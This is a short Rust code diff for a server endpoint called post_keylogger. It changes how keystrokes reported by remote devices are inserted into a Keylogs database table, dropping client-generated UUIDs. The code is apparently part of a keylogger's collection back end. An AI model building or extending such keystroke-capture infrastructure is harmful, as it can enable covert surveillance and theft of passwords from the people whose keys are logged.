@@ -45,15 +45,13 @@ pub async fn post_keylogger(
 
     for key in req.keys.iter() {
         let db_pool = app_state.db_pool.clone();
-        let id = Uuid::new_v4();
         sqlx::query!(
             r#"
                     INSERT INTO Keylogs
-                        (id, device_machine_id, key, created_at)
-                        VALUES ($1, $2, $3, $4)
+                        (device_machine_id, key, created_at)
+                        VALUES ($1, $2, $3)
                     ;
                 "#,
-            id,
             machine_id,
             &key.key_pressed,
             &key.at,
